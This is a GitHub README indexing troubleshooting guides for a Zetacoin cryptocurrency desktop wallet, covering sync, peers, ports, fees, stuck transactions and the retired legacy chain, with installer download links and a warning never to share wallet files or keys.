![Zetacoin Wallet](assets/banner-hub.png)

<h1 align="center">Zetacoin Wallet Troubleshooting</h1>

<p align="center">Sync, peers, ports, transactions and the retired chain, fixed in order.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds and their checksums are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

This repository holds the fix-oriented Zetacoin Wallet guides: the pages a reader opens when the wallet is
not doing what it should. Sync that never finishes, a peer count stuck at zero, a database that needs rebuilding, a
transaction that will not confirm, a port that is closed, or an old wallet file that has not moved in years.

The order inside each guide is deliberate. You get the diagnosis first, then the numbered fix, then what to do if that
fix did not hold, and finally the setting that stops the same failure returning. Nothing is a one-line answer dressed
up as a page: each guide names the file, the menu or the command involved, so it can be followed without guessing.

A large part of this set is about the retired chain. An old `Z` address cannot sync because its network no longer has
peers, and the honest answer is that those coins are not convertible; the guides say so rather than offering a workaround
that ends in a dead node. Every page here assumes the official desktop client from this account, and the checksums on the
release page remain the way to prove you installed it.

## Start here

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Zetacoin Wallet Not Syncing: Step-by-Step Fix](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/wallet-not-syncing-walkthrough.md) | From the status icon to a synced tip, in the order that works. |

</div>

---

## Guides in this repository

### Sync and peers

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Zetacoin Wallet Not Syncing: Step-by-Step Fix](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/wallet-not-syncing-walkthrough.md) | From the status icon to a synced tip, in the order that works. |
| [Fix "No Block Source Available" in Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/fix-no-block-source-error.md) | What the message means and the peers that clear it. |
| [Zetacoin Wallet Shows Zero Peers](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/zero-peer-connections-explained.md) | The peer count, the firewall and the nodes to add. |
| [Speed Up Zetacoin Blockchain Sync](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/speed-up-sync-time.md) | Bootstrap, peers and the disk that decides your sync time. |
| [Reindex, Rescan and Read Logs in Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/reindex-the-database-and-read-logs.md) | Three repair switches, what each rebuilds, and the log lines. |
| [Why the Zetacoin Wallet Uses CPU, RAM and Disk](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/why-the-client-uses-cpu-and-ram.md) | What a full node costs on a normal desktop. |

</div>

### Ports and configuration

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Zetacoin Ports, Nodes and zetacoin.conf](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/ports-nodes-and-conf-settings.md) | 17333, 6332 and the settings that open a node. |

</div>

### Transactions

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Send and Receive Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/send-and-receive-coins.md) | Addresses, fees and the confirmation that ends the wait. |
| [Zetacoin Confirmations and Fees](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/confirmations-and-transaction-fees.md) | How many blocks to wait and what a fee buys. |
| [Why Zetacoin Addresses Start With 9](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/why-addresses-start-with-9.md) | The current prefix, the legacy Z and the wallet that shows neither. |
| [A Stuck Zetacoin Transaction: What to Do](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/stuck-transaction-what-to-do.md) | Unconfirmed, dropped or double-spent: the three outcomes. |

</div>

### Install and update

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Run a Zetacoin Node Headless on Linux](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/run-a-full-node-headless.md) | The daemon, the config file and the ports it needs. |

</div>

### The retired chain

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Legacy Zetacoin Z-Address Coins](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/legacy-z-address-coins.md) | The Z prefix, the retired chain and the swap that closed. |
| [Is the Old SHA-256 Zetacoin Chain Still Running?](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/is-the-old-sha-256-chain-running.md) | The 2013 chain, its last block and the coins that ended with it. |
| [Why an Old Zetacoin Wallet Will Not Sync](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/why-an-old-wallet-will-not-sync.md) | A retired chain has no peers left to talk to. |

</div>

---

## More guides

- [Zetacoin Wallet Guides](https://github.com/zetacoin-wallet/zetacoin-wallet-guides)
- [Zetacoin Wallet Mining and Staking](https://github.com/zetacoin-wallet/zetacoin-solo-mining)
- [All 54 Zetacoin Wallet guides](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/README.md)

**Never send `wallet.dat`, a passphrase or a private key to anyone.**

## License

MIT
